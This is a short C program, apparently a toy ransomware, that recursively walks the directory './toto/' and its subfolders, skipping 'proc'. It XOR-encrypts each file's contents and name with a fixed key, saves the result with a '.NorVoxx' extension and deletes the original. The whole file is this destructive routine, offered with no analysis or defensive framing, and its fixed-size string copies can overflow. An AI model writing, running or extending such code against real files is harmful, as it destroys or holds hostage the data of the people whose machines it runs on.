#include <dirent.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

void fichier_cryp(char *path,char* file,int key){
    char p[250],f[250];
    int i = -1;
    strcpy(p,path);
    strcpy(f,file);

    FILE *fichier_in = fopen(strcat(path,file),"rb");
    while (f[++i] != '\0')
        f[i]^=key;

    FILE *fichier_cry = fopen(strcat(strcat(p,f),".NorVoxx"),"wb");
    if (fichier_in == NULL || fichier_cry == NULL)
        return;

    int buffer;
    while (fread(&buffer, sizeof(int), 1, fichier_in) == 1){
        buffer ^= key;
        fwrite(&buffer , sizeof(int),1,fichier_cry);
        //printf("%d",buffer);
    }
    fclose(fichier_in);
    fclose(fichier_cry);
    remove(path);
}
void fichier_liste(char *path){
    DIR *rep = opendir(path);
    if (rep == NULL)
        return ;
    struct dirent *file;
    while ((file = readdir(rep)) != NULL)
    {
        if (file->d_type == 8){
            char full_path[255];
            strcpy(full_path,path);
            fichier_cryp(full_path,file->d_name,131269);
        }
        if (file->d_type == 4)
        {
            char new_path[2064];
            if (strcmp("..",file->d_name) != 0 && strcmp(".",file->d_name) != 0 && strcmp("proc",file->d_name) != 0)
            {
                strcpy(new_path,path);
                strcat(strcat(new_path,file->d_name),"/");
                fichier_liste(new_path);
            }
        }
    }
}
int main(int argc, char const *argv[])
{
    /* code */
    fichier_liste("./toto/");
    return 0;
}